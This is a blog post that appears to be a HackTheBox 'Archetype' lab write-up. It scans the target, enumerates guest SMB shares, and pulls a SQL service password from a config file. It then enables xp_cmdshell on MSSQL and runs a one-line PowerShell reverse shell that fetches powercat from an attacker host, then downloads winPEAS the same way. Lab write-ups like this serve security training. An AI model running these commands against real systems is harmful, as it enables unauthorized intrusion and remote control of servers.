---
layout: post
title: HackTheBox Archetype
subtitle: StartingPoint Archetype Exam WriteUp
author: g3rm
categories: 
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - HTB
  - WriteUp
sidebar:
---


## Summary
![](assets/images/posts/2025-03-06-Archetype/c7aa0835353bb4a42ec1fb12fcdc3a18_MD5.jpeg)
## Target - 10.129.68.227
### Open Port
```bash
nmap -sC -sV -Pn -oN Archetype 10.129.68.227
```
![](assets/images/posts/2025-03-06-Archetype/1e4da9b4abb6d6341988fa1a18d32841_MD5.jpeg)
### SMB Enum (Guest Auth)
```bash
crackmapexec smb 10.129.68.227 -u 'guest' -p '' --shares
crackmapexec smb 10.129.68.227 -u 'guest' -p '' --spider backups --regex .

# ARCHETYPE\sql_svc : M3g4c0rp123
smbclient \\\\10.129.68.227\\backups -U 'guest' --password=''
get prod.dtsConfig
cat prod.dtsConfig
```

![](assets/images/posts/2025-03-06-Archetype/d16001211c17989921ca9d7924123219_MD5.jpeg)![](assets/images/posts/2025-03-06-Archetype/2b3979fe8f0430bac8990e09ff6483da_MD5.jpeg)

### mssql RCE
```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.68.227 -windows-auth

# xp_cmdshell 활성화
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# oneline reverse shell
EXEC xp_cmdshell 'powershell -c "IEX (New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.11:8000/powercat.ps1\");powercat -c 10.10.14.11 -p 4444 -e powershell"';
```

![](assets/images/posts/2025-03-06-Archetype/9c5ab89e51a73bef43ca35e9513680a4_MD5.jpeg)![](assets/images/posts/2025-03-06-Archetype/ddd88b5c3111a3ccd4219434fe508f7a_MD5.jpeg)

### winPEAS
```powershell
iwr -uri http://10.10.14.11:8000/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe


```

![](assets/images/posts/2025-03-06-Archetype/6c6a769b01b337f5043407c95d2f9261_MD5.jpeg)![](Pasted%20image%2020250306215106.png)